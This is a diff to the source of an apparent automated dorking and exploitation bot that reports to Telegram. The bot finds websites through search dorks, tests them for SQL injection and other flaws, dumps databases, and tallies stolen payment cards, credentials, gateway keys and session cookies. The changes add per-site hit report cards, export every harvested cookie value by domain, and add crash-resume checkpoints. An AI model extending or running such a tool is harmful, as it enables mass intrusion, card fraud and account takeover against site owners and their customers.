@@ -1865,6 +1865,99 @@ class MadyDorkerPipeline:
         
         return result
 
+    def _build_url_report_card(self, url: str, result: Dict) -> str:
+        """Build a compact report card for a scanned URL (auto-dork mode)."""
+        from urllib.parse import urlparse as _up
+        domain = _up(url).netloc
+        lines = [f"━━━━━━━━━━━━━━━━━━━━"]
+        lines.append(f"🎯 <b>Scan Complete</b>")
+        lines.append(f"🌐 <code>{domain}</code>")
+
+        # WAF
+        waf = result.get("waf")
+        if waf and isinstance(waf, dict):
+            parts = []
+            if waf.get("name"): parts.append(f"WAF:{waf['name']}")
+            if waf.get("cdn"): parts.append(f"CDN:{waf['cdn']}")
+            if waf.get("cms"): parts.append(f"CMS:{waf['cms']}")
+            if parts:
+                lines.append(f"🛡 {' | '.join(parts)}")
+
+        # Cookies
+        cookies = result.get("cookies", {})
+        regular = cookies.get("regular", {})
+        b3 = cookies.get("b3", {})
+        if regular or b3:
+            tags = []
+            sess_patterns = ["sessid", "session", "phpsessid", "jsessionid", "asp.net", "connect.sid"]
+            auth_patterns = ["token", "auth", "jwt", "csrf", "xsrf", "login"]
+            for name in regular:
+                nl = name.lower()
+                if any(p in nl for p in sess_patterns): tags.append(f"🔐{name}")
+                elif any(p in nl for p in auth_patterns): tags.append(f"🔑{name}")
+            cookie_line = f"🍪 {len(regular)} cookies"
+            if tags: cookie_line += f" ({', '.join(tags[:4])})"
+            if b3: cookie_line += f" | 🔵 {len(b3)} B3"
+            lines.append(cookie_line)
+
+        # SQLi
+        sqli = result.get("sqli", [])
+        if sqli:
+            for s in sqli:
+                lines.append(f"💉 <b>SQLi</b> [{s.get('technique','?')}] param=<code>{s.get('param','?')}</code> DBMS:{s.get('dbms','?')}")
+
+        # Dumps
+        dumps = result.get("dumps", [])
+        if dumps:
+            for d in dumps:
+                lines.append(f"📦 <b>Dump</b> {d.get('database','?')} — {d.get('tables',0)} tables, {d.get('total_rows',0)} rows")
+                if d.get('cards', 0): lines.append(f"   💳 Cards: {d['cards']}")
+                if d.get('credentials', 0): lines.append(f"   🔐 Creds: {d['credentials']}")
+
+        # Secrets
+        secrets = result.get("secrets", [])
+        if secrets:
+            gw = [s for s in secrets if isinstance(s, dict) and s.get('category') == 'gateway']
+            other = [s for s in secrets if isinstance(s, dict) and s.get('category') != 'gateway']
+            if gw: lines.append(f"🔑 {len(gw)} gateway keys")
+            if other: lines.append(f"🔐 {len(other)} secrets")
+
+        # Vulns
+        vuln_items = []
+        for vkey, vlabel in [("xss", "XSS"), ("ssti", "SSTI"), ("nosql", "NoSQL"),
+                              ("lfi", "LFI"), ("ssrf", "SSRF"), ("cors", "CORS"),
+                              ("redirects", "Redir"), ("crlf", "CRLF")]:
+            if result.get(vkey):
+                vuln_items.append(f"{len(result[vkey])}{vlabel}")
+        if vuln_items:
+            lines.append(f"⚠️ Vulns: {' | '.join(vuln_items)}")
+
+        # Ports
+        ports = result.get("ports", [])
+        if ports:
+            high = [p for p in ports if isinstance(p, dict) and p.get('risk') == 'high']
+            port_nums = [str(p.get('port','?')) for p in ports[:8]]
+            p_line = f"🔌 {len(ports)} ports ({', '.join(port_nums)})"
+            if high: p_line += f" — 🔴{len(high)} high-risk"
+            lines.append(p_line)
+
+        # Subdomains / dir fuzz
+        subs = result.get("subdomains", [])
+        dirs = result.get("dir_fuzz", [])
+        if subs or dirs:
+            extras = []
+            if subs: extras.append(f"{len(subs)} subs")
+            if dirs: extras.append(f"{len(dirs)} dirs")
+            lines.append(f"🗺️ {' | '.join(extras)}")
+
+        # JS analysis
+        js = result.get("js_analysis")
+        if js and hasattr(js, 'api_endpoints') and js.api_endpoints:
+            lines.append(f"🔬 JS: {len(js.api_endpoints)} API endpoints")
+
+        lines.append(f"━━━━━━━━━━━━━━━━━━━━")
+        return "\n".join(lines)
+
     async def _process_url_safe(self, url: str, results_list: list, findings_counter: list):
         """Process a URL with error handling for concurrent use."""
         try:
@@ -1874,7 +1967,7 @@ class MadyDorkerPipeline:
             )
             results_list.append(result)
             
-            # Log findings
+            # Check if anything was found
             findings = []
             if result.get("secrets"):
                 findings.append(f"{len(result['secrets'])} secrets")
@@ -1884,7 +1977,6 @@ class MadyDorkerPipeline:
                 findings.append(f"{len(result['dumps'])} dumps")
             if result.get("cookies", {}).get("b3"):
                 findings.append(f"B3 cookies")
-            # Cookie Hunter results
             hunt = result.get("cookie_hunt", {})
             if hunt.get("b3"):
                 findings.append(f"{len(hunt['b3'])} B3 traced")
@@ -1893,14 +1985,12 @@ class MadyDorkerPipeline:
                 findings.append(f"{len(hunt['gateway'])} gateway cookies ({', '.join(gws)})")
             if hunt.get("detected_gateways"):
                 findings.append(f"gateways: {', '.join(hunt['detected_gateways'])}")
-            # Recursive crawl results
             crawl = result.get("crawl", {})
             if crawl.get("pages_fetched"):
                 findings.append(
                     f"crawled {crawl['pages_fetched']}pg d{crawl['max_depth']} "
                     f"({crawl['param_urls']} params)"
                 )
-            # Extended vuln scanner results (v3.17)
             for vkey, vlabel in [("xss", "XSS"), ("ssti", "SSTI"), ("nosql", "NoSQL"),
                                   ("lfi", "LFI"), ("ssrf", "SSRF"), ("cors", "CORS"),
                                   ("redirects", "Redirect"), ("crlf", "CRLF")]:
@@ -1910,10 +2000,9 @@ class MadyDorkerPipeline:
             if findings:
                 findings_counter.append(1)
                 logger.info(f"  FOUND: {', '.join(findings)} at {url[:60]}")
-                await self._send_progress(
-                    f"🎯 <b>HIT!</b> {', '.join(findings)}\n"
-                    f"<code>{url[:80]}</code>"
-                )
+                # Send compact report card instead of one-liner
+                report_card = self._build_url_report_card(url, result)
+                await self._send_progress(report_card)
                 # Auto-export every N hits
                 self._hits_since_export += 1
                 if self._hits_since_export >= self._auto_export_threshold:
@@ -1975,6 +2064,23 @@ class MadyDorkerPipeline:
         elif self.config.dork_shuffle:
             random.shuffle(dorks)
         
+        # Compute dork list fingerprint for checkpoint validation
+        import hashlib as _hl
+        dork_hash = _hl.md5("|".join(dorks[:20]).encode()).hexdigest()[:12]
+        
+        # Check for resume checkpoint from previous crash/reboot
+        resume_index = 0
+        checkpoint = self.db.get_dork_checkpoint()
+        if checkpoint and checkpoint.get('dork_hash') == dork_hash:
+            resume_index = checkpoint.get('dork_index', 0)
+            if resume_index > 0 and resume_index < len(dorks):
+                logger.info(f"Resuming from dork {resume_index}/{len(dorks)} (checkpoint)")
+                await self._send_progress(
+                    f"⏩ <b>Resuming</b> from dork {resume_index}/{len(dorks)} (saved checkpoint)"
+                )
+            else:
+                resume_index = 0
+        
         logger.info(f"Processing {len(dorks)} dorks this cycle")
         await self._send_progress(
             f"🔄 <b>Cycle {self.cycle_count}</b> — Processing {len(dorks)} dorks...\n"
@@ -1991,21 +2097,32 @@ class MadyDorkerPipeline:
                 logger.info("Pipeline stopped, breaking cycle")
                 break
             
+            # Skip dorks before checkpoint resume point
+            if i < resume_index:
+                continue
+            
             self.reporter.stats.dorks_processed += 1
             
-            # Progress update every 10 dorks
-            if (i + 1) % 10 == 0:
+            # Save checkpoint every 10 dorks for crash recovery
+            if i % 10 == 0:
+                try:
+                    self.db.save_dork_checkpoint(self.cycle_count, i, dork_hash)
+                except Exception:
+                    pass
+            
+            # Progress update every 50 dorks (reduced from 10 to cut spam)
+            if (i + 1) % 50 == 0:
                 await self._send_progress(
                     f"⏳ Dork <b>{i+1}/{len(dorks)}</b> | "
                     f"URLs found: {cycle_urls_found} | Hits: {len(cycle_findings)}"
                 )
-                # Warn if no results after first batch
-                if (i + 1) == 10 and cycle_urls_found == 0:
-                    await self._send_progress(
-                        "⚠️ First 10 dorks returned 0 URLs. "
-                        "Search engines may be rate-limiting or proxies may be dead."
-                    )
                 await asyncio.sleep(0)  # Yield to event loop
+            # Warn if no results after first 50
+            if (i + 1) == 50 and cycle_urls_found == 0:
+                await self._send_progress(
+                    "⚠️ First 50 dorks returned 0 URLs. "
+                    "Search engines may be rate-limiting or proxies may be dead."
+                )
             
             try:
                 # Search for URLs
@@ -2043,8 +2160,8 @@ class MadyDorkerPipeline:
                 cycle_urls_found += len(filtered_urls)
                 logger.info(f"[{i+1}/{len(dorks)}] Dork: {dork[:60]}... → {len(filtered_urls)} new URLs")
                 
-                # Notify when URLs found
-                if len(filtered_urls) >= 3:
+                # Notify when URLs found (only for big batches to reduce noise)
+                if len(filtered_urls) >= 5:
                     await self._send_progress(
                         f"🔗 Dork {i+1}: <b>{len(filtered_urls)} new URLs</b>\n"
                         f"<code>{dork[:80]}</code>"
@@ -2081,6 +2198,12 @@ class MadyDorkerPipeline:
         
         # Save state after cycle
         self._save_state()
+        
+        # Clear checkpoint — cycle completed fully
+        try:
+            self.db.clear_dork_checkpoint()
+        except Exception:
+            pass
         
         # Count cookies found this cycle
         cookie_count = self.db.get_cookie_count() if hasattr(self, 'db') else 0
@@ -2195,12 +2318,18 @@ class MadyDorkerPipeline:
         logger.info("Pipeline stop requested")
 
     async def _status_loop(self):
-        """Periodically send status updates."""
+        """Periodically send status updates (every 15min, only if stats changed)."""
+        _last_status_hash = ""
         while self.running:
             try:
-                await asyncio.sleep(300)  # Every 5 minutes
+                await asyncio.sleep(900)  # Every 15 minutes
                 if self.running:
                     stats = self.get_stats()
+                    # Only send if something actually changed
+                    status_hash = f"{stats['urls_scanned']}_{stats['gateways_found']}_{stats['sqli_vulns']}_{stats['secrets_found']}_{stats['cards_found']}"
+                    if status_hash == _last_status_hash:
+                        continue
+                    _last_status_hash = status_hash
                     await self._send_progress(
                         f"📊 <b>Status Update</b>\n"
                         f"⏱ Uptime: {stats.get('uptime', 'N/A')}\n"
@@ -2365,6 +2494,28 @@ class MadyDorkerPipeline:
         except Exception:
             pass
         
+        # — ALL Cookies (grouped by domain) —
+        try:
+            all_cookies = self.db.get_all_cookies()
+            if all_cookies:
+                lines.append("--- ALL COOKIES ---")
+                by_domain = {}
+                for c in all_cookies:
+                    dom = c.get('domain', '?')
+                    if dom not in by_domain:
+                        by_domain[dom] = []
+                    by_domain[dom].append(c)
+                for dom in sorted(by_domain.keys()):
+                    lines.append(f"  [{dom}]")
+                    for c in by_domain[dom]:
+                        ctype = c.get('cookie_type', '')
+                        tag = f" ({ctype})" if ctype else ""
+                        lines.append(f"    {c.get('cookie_name', '?')}={c.get('cookie_value', '?')[:60]}{tag}")
+                    lines.append("")
+                lines.append("")
+        except Exception:
+            pass
+        
         # — All Scanned Domains —
         if self.seen_domains:
             lines.append("--- SCANNED DOMAINS ---")
@@ -2424,6 +2575,8 @@ class MadyDorkerPipeline:
                 "gateways": self.found_gateways[-500:],
                 "secrets": self.found_secrets[-500:],
                 "cards": self.found_cards[-200:],
+                "cookies": self.db.get_all_cookies() if hasattr(self, 'db') else [],
+                "b3_cookies": self.db.get_b3_cookies() if hasattr(self, 'db') else [],
             }
             with open(json_path, 'w') as f:
                 _json.dump(json_data, f, indent=2, default=str)
@@ -3242,7 +3395,6 @@ async def _do_scan(update: Update, url: str):
     ) as session:
         
         # ═══════ PHASE 1: WAF + Cookies + Tech Detection ═══════
-        await update.message.reply_text("⏳ Phase 1: WAF Detection + Cookie Extraction...", parse_mode="HTML")
         
         if p.config.waf_detection_enabled:
             try:
@@ -3287,7 +3439,6 @@ async def _do_scan(update: Update, url: str):
                 logger.debug(f"Port scan error in cmd_scan: {e}")
         
         # ═══════ PHASE 2: Secret Extraction (deep — discovers pages + endpoints) ═══════
-        await update.message.reply_text("⏳ Phase 2: Deep Secret Extraction + Endpoint Discovery...", parse_mode="HTML")
         
         try:
             scan_result = await p.secret_extractor.deep_extract_site(url, session)
@@ -3307,11 +3458,6 @@ async def _do_scan(update: Update, url: str):
         api_brute_result = None
         spa_result = None
         detected_framework = ""
-        
-        await update.message.reply_text(
-            "⏳ Phase 2.5: SPA Intelligence — JS Bundle Analysis + API Discovery...",
-            parse_mode="HTML"
-        )
         
         # Step A: JS Bundle Analysis — parse webpack/Next.js chunks for hidden endpoints
         try:
@@ -3380,11 +3526,7 @@ async def _do_scan(update: Update, url: str):
                         full_route = base_url + route
                         discovered_all_urls.add(full_route)
             else:
-                await update.message.reply_text(
-                    f"🔬 JS Analysis: {js_analysis_result.js_files_analyzed} files analyzed — "
-                    f"no endpoints/secrets found in bundles",
-                    parse_mode="HTML"
-                )
+                pass  # No JS results — skip noise
         except Exception as e:
             logger.error(f"JS analysis error: {e}")
         
@@ -3442,10 +3584,7 @@ async def _do_scan(update: Update, url: str):
                                 if ac_parsed.query:
                                     discovered_param_urls.add(ac_url)
                 else:
-                    await update.message.reply_text(
-                        "🌐 SPA rendering: no additional forms/links/API calls found in rendered DOM",
-                        parse_mode="HTML"
-                    )
+                    pass  # SPA found nothing extra — skip noise
         except Exception as e:
             logger.error(f"SPA extraction error: {e}")
         
@@ -3520,10 +3659,7 @@ async def _do_scan(update: Update, url: str):
                     if ep_parsed.query:
                         discovered_param_urls.add(ep.url)
             else:
-                await update.message.reply_text(
-                    f"🔨 API Bruteforce: {api_brute_result.endpoints_probed} paths probed — none responsive",
-                    parse_mode="HTML"
-                )
+                pass  # API bruteforce found nothing — skip noise
         except Exception as e:
             logger.error(f"API bruteforce error: {e}")
         
@@ -3531,11 +3667,6 @@ async def _do_scan(update: Update, url: str):
         # ═══════ PHASE 3: Deep Crawl — Firecrawl first, fall back to manual ═══════
         firecrawl_crawled = False
         if p.config.firecrawl_enabled and p.config.firecrawl_crawl_enabled and p._firecrawl_engine:
-            await update.message.reply_text(
-                f"⏳ Phase 3: Firecrawl Deep Crawl <code>{base_domain}</code>...\n"
-                f"(JS rendering + sitemap + dedup built-in)",
-                parse_mode="HTML"
-            )
             try:
                 # First, map all URLs (fast, no scraping)
                 mapped_urls = await p._firecrawl_engine.map_urls(url, limit=500)
@@ -3546,11 +3677,6 @@ async def _do_scan(update: Update, url: str):
                             discovered_all_urls.add(mu)
                             if p_mu.query:
                                 discovered_param_urls.add(mu)
-                    await update.message.reply_text(
-                        f"🗺️ Firecrawl Map: <b>{len(mapped_urls)}</b> URLs discovered\n"
-                        f"Param URLs: {len(discovered_param_urls)}",
-                        parse_mode="HTML"
-                    )
 
                 # Then crawl for content (cookies, secrets in rendered JS)
                 fc_pages = await p._firecrawl_engine.crawl(url, limit=p.config.firecrawl_crawl_limit)
@@ -3628,13 +3754,6 @@ async def _do_scan(update: Update, url: str):
                                     discovered_param_urls.add(ep)
             
             if p.crawler:
-                await update.message.reply_text(
-                    f"⏳ Phase 3: Recursive BFS Crawl <code>{base_domain}</code>...\n"
-                    f"Depth: {p.config.deep_crawl_max_depth} | Max pages: {p.config.deep_crawl_max_pages}\n"
-                    f"Seeds: {1 + len(extra_seeds)} | Already found {pages_scanned} pages",
-                    parse_mode="HTML"
-                )
-                
                 progress_counter = [0]
                 
                 async def _scan_on_page(page):
@@ -3793,13 +3912,6 @@ async def _do_scan(update: Update, url: str):
         targets_to_test = sorted_targets[:max_sqli_test]
         
         if targets_to_test:
-            await update.message.reply_text(
-                f"⏳ Phase 4: SQLi Testing <b>{len(targets_to_test)}</b> endpoints "
-                f"(URL + Cookie + Header + POST injection)...\n"
-                f"WAF: {waf_name or 'None detected'}",
-                parse_mode="HTML"
-            )
-            
             for idx, target_url in enumerate(targets_to_test):
                 try:
                     # Extract cookies for this specific URL too
@@ -4167,8 +4279,8 @@ async def _do_scan(update: Update, url: str):
                 cookie_hints_batch.append(hint)
         if cookie_hints_batch:
             text += "\n  <b>💡 Cookie Intelligence:</b>\n"
-            for ch in cookie_hints_batch[:8]:
-                text += f"  {ch}\n\n"
+            for ch in cookie_hints_batch[:3]:
+                text += f"  {ch}\n"
     else:
         text += "  None found\n"
     
@@ -4304,18 +4416,10 @@ async def _do_scan(update: Update, url: str):
             "file_upload": "📤 Upload", "admin_pages": "👤 Admin",
             "api_calls": "🌍 ExtAPI", "interesting_js": "📜 JS",
         }
-        ep_hints_batch = []
         for key, label in ep_labels.items():
             eps = all_endpoints.get(key, [])
             if eps:
                 text += f"  {label}: {len(eps)}\n"
-                eh = get_endpoint_hint(key)
-                if eh:
-                    ep_hints_batch.append(eh)
-        if ep_hints_batch:
-            text += "\n  <b>💡 Endpoint Intelligence:</b>\n"
-            for eh in ep_hints_batch:
-                text += f"  {eh}\n\n"
         text += "\n"
     
     # ── SQLi ──
@@ -4377,6 +4481,9 @@ async def _do_scan(update: Update, url: str):
             if pr.get('version'):
                 text += f" {pr['version']}"
             text += ")\n"
+        # Only show hints for high-risk ports (max 3)
+        high_risk = [pr for pr in all_port_results if pr['risk'] == 'high']
+        for pr in high_risk[:3]:
             ph = get_port_hint(pr['port'])
             if ph:
                 text += f"     💡 {ph}\n"
